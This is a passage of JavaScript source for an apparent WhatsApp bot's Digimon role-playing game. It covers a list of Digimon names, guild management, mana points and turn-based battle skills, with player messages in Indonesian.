    "Monodramon", "Dorumon", "Hawkmon", "Armadillomon", "Wormmon", "Shoutmon", 
    "Ballistamon", "Dorulumon", "Cutemon", "Sparrowmon", "Monitamon", "Damemon", 
    "Gumdramon", "Astamon", "Arresterdramon", "Omnimon", "Gallantmon", "Magnamon", 
    "Alphamon", "Cherubimon", "Lucemon", "Susanoomon", "Beelzemon", "Leopardmon", 
    "Jesmon", "Dynasmon", "LordKnightmon", "Crusadermon", "Examon", "Sleipmon", 
    "UlforceVeedramon", "KaiserGreymon", "MagnaGarurumon", "ZeedMillenniummon", 
    "GranDracmon", "Alraumon", "Betamon", "Bakemon", "Dokugumon", "Gesomon","Gatchmon","Navimon",
    "Musimon","Cameramon","Perorimon","Dokamon","Mailmon",
    "Weatherdramon","Viramon","Hackmon", "Photomon", "Timemon","Offmon","Charismon",
    "Shunemon", "Beautymon", "Dezipmon","Globemon","Raidramon", "Applidramon", "Sakusimon",
    "Paydramon","Fakemon", "DoGatchmon","Commandomon", "Revivemon",
    "Saurmon", "Warudamon","Troopmon", "Dreamon", "Soundmon", "Clifmon","Ashuramon", "Kizunamon", "Lioormon",
    "Todomon", "Yureimon", "Guardromon","Pippimon","Katsuimon","Coachmon", "Maildramon","Fumemon","Securimon",
    "Pucchiemon", "Sweetsmon", "Puttimon", "Lampmon", "Gomimon", "Cometmon", "Ropuremon", "Veemon", "Salamon", "Candlemon", "SnowAgumon", 
    "SnowGoblimon", "Muchomon", "RedVegiemon", "Kiwimon", "Ninjamon", "Piximon", 
    "Digitamamon", "Togemon", "Mamemon", "Giromon", "BigMamemon", "MetalMamemon", 
    "PrinceMamemon", "Tinmon", "ExTyrannomon", "MasterTyrannomon", "MetalTyrannomon", 
    "BlueMeramon", "DarkTyrannomon", "Vegiemon", "Woodmon", "Cherrymon", "Shurimon", 
    "Porcupamon", "Opossumon", "Neemon", "Turuiemon", "ShimaUnimon", "Grizzlymon", 
    "Ponchomon", "Pistmon", "Clockmon", "Icemon", "DeadlyAxemon", "Tuwarmon", 
    "Butenmon", "Fangmon", "Vamdemon", "Petermon", "Manbomon", "Pteramon", "MetalPhantomon", 
    "Mantaraymon", "MameTyramon", "SandYanmamon", "Porcupamon", "NeoDevimon", 
    "Parasimon", "Volcanomon", "DarkKnightmon", "Airdramon", "Saberdramon", "Mushroomon", 
    "CherryBlossomon", "Orochimon", "Roachmon", "Phantomon", "Piximon", "Gizamon", 
    "Sukamon", "PlatinumSukamon", "Raremon", "Numemon", "PlatinumNumemon", "Monzaemon", 
    "WaruMonzaemon", "Garbamon", "Scorpiomon", "Boltmon", "Blossomon", "Magnadramon", 
    "Whamon", "Syakomon", "Pagumon", "Hagurumon", "Kapurimon", "Solarmon", "Jazamon", 
    "FanBeemon", "Spadamon", "Gladimon", "Greymon", "Mammothmon", "Wargreymon", 
    "Garurumon", "Chibomon", "Sunmon", "Moonmon", "ModokiBetamon", 
    "FanBeemon", "Kudamon", "Falcomon", "Crabmon", "ShogunGekomon", "Floramon", 
    "Tapirmon", "Mojyamon", "SnowAgumon", "ClearAgumon", "Goblimon", "Impmon", 
    "Monmon", "Kokuwamon", "Gotsumon", "Lynxmon", "Soulmon", "Pistmon", "Poromon", 
    "Bokomon", "Kunemon", "Kamemon", "Swimmon", "Mushroomon", "Aruraumon", "Pillomon", 
    "Ankylomon", "Stegomon", "Pteramon", "ShellNumemon", "Mamemon", "Deramon", 
    "Vegiemon", "Cherrymon", "SableLeeomon", "Panjyamon", "Leomon", "Lykamon", 
    "Pinochimon", "SandYanmamon", "Junkmon", "Zudomon", "Butenmon", "Rockmon", 
    "Togemon", "Kiwimon", "Ninjamon", "DarkTyrannomon", "Yanmamon", "Shurimon", 
    "Ninjamon", "Togemon", "Kiwimon", "Monochromon", "ShadowToyAgumon", "Panjyamon", 
    "Shoutmon", "KingWhamon", "Whamon", "Bakomon", "Raremon", "Greymon", "Wargreymon", 
    "MetalGreymon", "Mephismon", "MarineAngemon", "Parrotmon", "DarkTyrannomon", 
    "Swanmon", "Devimon", "SkullGreymon", "Devidramon", "Cerberumon", "Panjyamon", 
    "Greymon", "Mephismon", "Pistmon", "Boltmon", "SandYanmamon", "Deltamon", "Piximon"
];

let userDigimons = {};
let guilds = {};
let userGuilds = {};


const guildsPath = './Rpg/Guilds.json';
const userGuildsPath = './Rpg/UserGuilds.json';

// Load data from JSON file
const loadData = (path, defaultValue) => {
    if (fs.existsSync(path)) {
        try {
            return JSON.parse(fs.readFileSync(path, 'utf-8'));
        } catch (err) {
            console.error('Error reading JSON file:', err);
            return defaultValue;
        }
    }
    return defaultValue;
};

userDigimons = loadData(path, {});
guilds = loadData(guildsPath, {});
userGuilds = loadData(userGuildsPath, {});

// Save data to JSON file
const saveData = (path, data) => {
    try {
        fs.writeFileSync(path, JSON.stringify(data, null, 2));
        console.log('Data saved successfully');
    } catch (err) {
        console.error('Error saving data:', err);
    }
};

    const LINODE_API_TOKEN = global.apilinode;
    const API_TOKEN = global.apitokendo;
    
    
    
    
    
    
    
   
   
   
    
    
const pathh = './Rpg/guilds.json';
const userPath = './Rpg/userss.json';

// Load guilds data & sv

if (fs.existsSync(pathh)) {
    guilds = JSON.parse(fs.readFileSync(pathh, 'utf-8'));
}


let users = {};
if (fs.existsSync(userPath)) {
    users = JSON.parse(fs.readFileSync(userPath, 'utf-8'));
    for (let userId in users) {
        if (!users[userId].mp) {
            users[userId].mp = 0;
        }
    }
}

const saveGuilds = () => {
    fs.writeFileSync(pathh, JSON.stringify(guilds, null, 2));
};


const saveUsers = () => {
    fs.writeFileSync(userPath, JSON.stringify(users, null, 2));
};

    //======// Mana point & more stats 
    const addMP = (amount) => {


    userdb.mp = Math.min(userdb.mp + amount, userdb.mpmax);
    return `MP ${m.sender.replace("@s.whatsapp.net", "")} bertambah ${amount}. Total MP sekarang: ${userdb.mp}`
};

    
const reduceMP = (amount) => {
if (userdb.mp < 1) return m.reply("*`[ NO MORE MP ]`* -> cannot used skils.")

    
   userdb.mp = Math.max(userdb.mp - amount, 0);
    return `MP ${m.sender.replace("@s.whatsapp.net", "")} berkurang ${amount}. Total MP sekarang: ${userdb.mp}`
};
    
    //=======//
    
    
    // guild
const createGuild = (guildName, creatorId) => {
    if (guilds[guildName]) {
        return reply(`Guild dengan nama ${guildName} sudah ada.`);
    }

    if (users[creatorId] && users[creatorId].guild) {
        return reply(`Anda sudah menjadi anggota guild: ${users[creatorId].guild}`);
    }

    guilds[guildName] = { leader: creatorId, members: [] };
    users[creatorId] = { guild: guildName, role: 'leader' };

    saveGuilds();
    saveUsers();

    return reply(`Guild ${guildName} berhasil dibuat!`);
};

    const listGuilds = () => {
    const guildNames = Object.keys(guilds);
    if (guildNames.length === 0) {
        return reply("Tidak ada guild yang tersedia.");
    }
    return reply(`Daftar guild yang tersedia:\n- ${guildNames.join('\n- ')}`);
};
    
const getGuildInfo = (guildName) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`Guild dengan nama ${guildName} tidak ditemukan.`);
    }

    const leader = guild.leader;
    const members = guild.members;

    let info = `*${m2}< G U I L D - I N F O >${m2}* 

*Name: ${guildName}*\nLeader: ${leader}\n\nMembers:\n`;
    members.forEach((member, index) => {
        info += `\n${index + 1}. ${member}`;
    });

    return reply(info);
};

    
const joinGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`Guild dengan nama ${guildName} tidak ditemukan.`);
    }

    if (users[userId] && users[userId].guild) {
        return reply(`Anda sudah menjadi anggota guild: ${users[userId].guild}`);
    }

    guild.members.push(userId);
    users[userId] = { guild: guildName, role: 'member' };

    saveGuilds();
    saveUsers();

    return reply(`Anda berhasil bergabung dengan guild ${guildName}!`);
};

const deleteGuild = (guildName, userId) => {
    const guild = guilds[guildName];
    if (!guild) {
        return reply(`Guild dengan nama ${guildName} tidak ditemukan.`);
    }

    if (guild.leader !== userId) {
        return reply(`Anda tidak memiliki izin untuk menghapus guild ini.`);
    }

    guild.members.forEach(member => {
        delete users[member];
    });

    delete users[guild.leader];
    delete guilds[guildName];

    saveGuilds();
    saveUsers();

    return reply(`Guild ${guildName} berhasil dihapus!`);
};

    const leaveGuild = (userId) => {
    const userx = users[userId];
    if (!userx || !userx.guild) {
        return reply(`Anda tidak berada dalam guild manapun.`);
    }

    const guildName = userx.guild;
    const guild = guilds[guildName];

    if (userx.role === 'leader') {
        return reply(`Sebagai leader, Anda tidak bisa keluar dari guild. Anda harus menghapus guild.`);
    }

    guild.members = guild.members.filter(member => member !== userId);
    delete users[userId];

    saveGuilds();
    saveUsers();

    return reply(`Anda telah keluar dari guild ${guildName}.`);
};

   
    
const getRandomDigimon = () => {
    const availableDigimons = digimons.filter(digimon => {
        return !Object.values(userDigimons).includes(digimon);
    });
    return availableDigimons.length > 0 ? availableDigimons[Math.floor(Math.random() * availableDigimons.length)] : null;
};
   //=======//
   
 
const BATTLES_FILE = './Rpg/battles.json';

const loadBattlesData = () => {
    if (fs.existsSync(BATTLES_FILE)) {
        const data = fs.readFileSync(BATTLES_FILE);
        return JSON.parse(data);
    } else {
        return {
            battleRequests: {},
            ongoingBattles: {}
        };
    }
};

const saveBattlesData = (data) => {
    fs.writeFileSync(BATTLES_FILE, JSON.stringify(data, null, 2));
};

const { battleRequests, ongoingBattles } = loadBattlesData();

const challengeBattle = (challengerId, challengedId) => {
    console.log('challengerId:', challengerId);
    console.log('challengedId:', challengedId);
    
    userdb.attacksi = challengedId
    userdb.isBattle = true;
    userdb.breakk = false
    if (battleRequests[challengedId]) {
        return reply('Pengguna tersebut sudah memiliki permintaan tantangan yang tertunda.');
    }

    battleRequests[challengedId] = challengerId;
    ongoingBattles[challengerId] = { challengedId, status: 'pending' };

    saveBattlesData({ battleRequests, ongoingBattles });

    setTimeout(() => {
        ptz.sendMessage(challengedId, { text: `*Battle Req*\n\n*Acc / Decline*\nDigimon: *${userDigimons[challengerId]}*\n> .acc-battle ${challengerId.replace("@s.whatsapp.net", "")}<-> .reject-battle` });
    }, 1300);

    return reply(`Tantangan telah dikirim ke ${challengedId}. Menunggu persetujuan.\n- *Cancel Battle : .cancel-battle*`);
};

const skillsList = `
\n\n*${m2}[ SKILLS LIST ]${m2}*\n\nTech : .tech  
- *< 18 MP >*
> Super Attack

Attk : .attack 
* *< 0 MP >*
> Basic Attack

Heal : .heald
- *< 23 MP >*
> Heal HP 400+

Focus : .focus
- *< 36 MP >*
> ATK charge - 19+

Card Slash : .slash
- *< 20 MP >*
> Random Card Slash

Break Attack : .break 
- *< 43 MP >*
> Break - more time for attack

*${m2}< LETS GO PARTNER ! >${m2}*
`;


const startBattle = (challengedId, challengerId) => {
    
    ptz.sendMessage(challengerId, { text: `Battle started! Your turn to attack ${userDigimons[challengedId]}.${skillsList}` });
    setTimeout(() => {
        ptz.sendMessage(challengedId, { text: `Battle started! Your turn to attack ${userDigimons[challengerId]}.${skillsList}` });
    }, 1200); // Using setTimeout instead of sleep
};

const acceptBattle = (challengedId, challengerId) => {
    userdb.attacksi = challengedId
    userdb.isBattle = true;
    userdb.breakk = false

   // if (!ongoingBattles[challengerId]) {
        console.log('Battle Requests:', battleRequests);
        console.log('Ongoing Battles:', ongoingBattles);
       /* return reply('Tidak ada tantangan yang tertunda.');
   }*/

    ongoingBattles[challengedId].status = 'accepted';
    delete battleRequests[challengedId];

    saveBattlesData({ battleRequests, ongoingBattles });

    reply(`Tantangan diterima. Pertarungan dimulai antara ${m.sender.replace('@s.whatsapp.net', '')} dan ${challengedId.replace('@s.whatsapp.net', '')}!`);
    setTimeout(() => {
    return startBattle(challengedId, challengerId);
    }, 1000)
};

const cancelBattle = (challengerId) => {
    const battle = ongoingBattles[challengerId];
    
    if (!battle) {
        return reply('Tidak ada tantangan yang tertunda.');
    }

    const challengedId = battle.challengedId;
    delete ongoingBattles[challengerId];
    delete battleRequests[challengedId];

    userdb.isBattle = false;

    saveBattlesData({ battleRequests, ongoingBattles });

    return reply('Tantangan dibatalkan.');
};
//========// function battle, jangan di oprek bakal error lalu salahin saya

let responkalahn = `
*< [ L O S E ] >* 

_Kamu kalah dan mendapatkan leveling_
> Battle Berakhir - kalah ×
`

let responmenangn = `
*< [ W I N N E R ] >* 

_Kamu menang dan mendapatkan leveling dan hadiah_
> Battle Berakhir - menang •
`

//========//

const attack = async (typenyahb, m, userId, plusn = 0) => {
if (userdb.isBattle === false) return m.reply("*`[ DENIED ]`* You Not in match, try battle with friends.")

const isdarahnol = getDarah(userId)

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
addXP(m.sender, 79)
userdb.bits += 100
userdb.isBattle = false
    if (!ongoingBattles[challengerId]) {
        return reply('Tidak ada tantangan yang tertunda.');
    }

    const challengedId = ongoingBattles[challengerId].challengedId;
    delete ongoingBattles[challengerId];
    delete battleRequests[challengedId];

    saveBattlesData({ battleRequests, ongoingBattles });
return;
}, 1000)
} else {
}
console.log("Log Kalah / Menang")

    let resleebh = '*`[ COLDOWN ]`* Cannot Used Skils, Please Wait...';
    
    if (userdb.breakk === false) {
       if (new Date() - userdb.kuldonattack < 9000) {
      m?.reply(resleebh);
      return;
    }
    userdb.kuldonattack = new Date();        
    
    
    console.log("Respone bagus")
    
    
let cooldownn = 9000; 
    userdb.kuldonattack = new Date() * 1 + cooldownn;
} else if (userdb.breakk === true) {
       if (new Date() - userdb.attacknocul < 7000) {
       
       if (typenyahb === "Tech") {
            const atkfusb = userdb.attackdigi += 30;
              
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(23);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 30;



if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Attk") {
            const atkfusb = userdb.attackdigi;
              kurangDarah(userId, atkfusb);
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .attack_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*
*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1200);
            
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
        } else if (typenyahb === "Heal") {
            addDarah(m.sender, 400, userdb.maxdarahdigi);
            reduceMP(31);
            ptz.sendMessage(userId, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400+ Hp_
_Healt Point: ${getDarah(userId)}
_Coldown: 9 Sec_`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400 Hp_
_Coldown: 9 Sec_`
                });
            }, 1200);
        } else if (typenyahb === "Focus") {
            const atkfusb = userdb.attackdigi += 56;

            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}

> ${m2}OVER POWER FOCUS ATTACK${m2}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

> ${m2}OVER POWER FOCUS ATTACK${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(36);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 56;
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Card") {
           reduceMP(36);
            const ishasilvahj = pickRandom(["Attack Boost", "back counter", "triple"]);
            if (ishasilvahj === "Attack Boost") {
                kurangDarah(userId, 61);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Attack Boost !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 61 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
            } else if (ishasilvahj === "back counter") {
                kurangDarah(userId, 39);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Back Counter\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 39 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
            } else if (ishasilvahj === "triple") {
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> 3x Attack MORE !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 84 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")
            }
        } else if (typenyahb === "Break") {
        reduceMP(41);
        console.log("*************")
        const isMissbreak = await pickRandom(["MISS","ATTK"])
        
        if (isMissbreak === "ATTK") {
            kurangDarah(userId, userdb.attackdigi);
            
            ptz.sendMessage(m.sender, { text: "*`[ BREAK INFINITY ]`* -> Attack Boost\n> <!> Succesfuly Attack" });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: ${userdb.attackdigi} attk & more 7 Sec No coldown_
_Coldown: -_

> ${m2}<!> BREAK INFINITY <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
                
                userdb.breakk = true
                userdb.kuldonattack = new Date();    
let cooldownn = 9000; 
    userdb.attacknocul = new Date() * 1 + cooldownn;

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            }, 1800);
            } else if (isMissbreak === "MISS") {
                        ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
                
            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> BREAK INFINITY SLASH - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .break_
_Result: 0 attk & 0 more sec Attk_
_Coldown: 9 Sec_

${m2}<!> MISS ATTACK <!>${m2}`
                });
            }, 1200)
            }
       return;
       }
       
    userdb.breakk = false
    m.reply("Break Attack Effect - 0, return to normal")
    return
}} //====//
sleep(1000)

        if (typenyahb === "Tech") {
            const atkfusb = userdb.attackdigi += 30;
              
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(23);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 30;


if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Attk") {
            const atkfusb = userdb.attackdigi;
              kurangDarah(userId, atkfusb);
            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .attack_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .tech_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*
*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1200);
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Heal") {
            addDarah(m.sender, 400, userdb.maxdarahdigi);
            reduceMP(31);
            ptz.sendMessage(userId, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400+ Hp_
_Healt Point: ${getDarah(userId)}
_Coldown: 9 Sec_`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> HEAL ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .heald_
_Result: 400 Hp_
_Coldown: 9 Sec_`
                });
            }, 1200);
        } else if (typenyahb === "Focus") {
            const atkfusb = userdb.attackdigi += 56;

            ptz.sendMessage(m.sender, {
                text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_
_You MP:_ ${userdb.mp}

> ${m2}OVER POWER FOCUS ATTACK${m2}`
            });

            setTimeout(() => {
                ptz.sendMessage(userId, {
                    text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .pcus_
_Result: ${atkfusb} attk_
_Coldown: 9 Sec_

> ${m2}OVER POWER FOCUS ATTACK${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                });
            }, 1800);
            reduceMP(36);
            kurangDarah(userId, atkfusb);
            userdb.attackdigi -= 56;
            

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

        } else if (typenyahb === "Card") {
           reduceMP(36);
            const ishasilvahj = pickRandom(["Attack Boost", "back counter", "triple"]);
            if (ishasilvahj === "Attack Boost") {
                kurangDarah(userId, 61);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Attack Boost !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 61 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                

if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            } else if (ishasilvahj === "back counter") {
                kurangDarah(userId, 39);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> Back Counter\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
                        text: `*${m2}[ ( ${userDigimons[m.sender]} ) -> CARD - ATTACK ]${m2}*

*-_ Parameter Info _-*

_Digi: ${userDigimons[m.sender]}_
_Use Type: .slash_
_Result: 39 attk_
_Coldown: 9 Sec_

> ${m2}<!> CARD SLASH <!>${m2}

*${m2}[ ( ${userDigimons[userId]} ) <- ATTACKED ]${m2}*

*-_ Your Parameter Info _-*

_Digi: ${userDigimons[userId]}_
_Healt: ${getDarah(userId)}_`
                    });
                }, 1200);
                
if (isdarahnol === 0) {
ptz.sendMessage(m.sender, {text:responmenangn})
setTimeout(() => {
ptz.sendMessage(userId, {text:responkalahn})
return;
}, 1000)
}
console.log("Log Kalah / Menang")

            } else if (ishasilvahj === "triple") {
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                kurangDarah(userId, 21);
                ptz.sendMessage(m.sender, { text: "*`[ CARD SLASH ]`* -> 3x Attack MORE !\n> <!> Succesfuly Attack" });

                setTimeout(() => {
                    ptz.sendMessage(userId, {
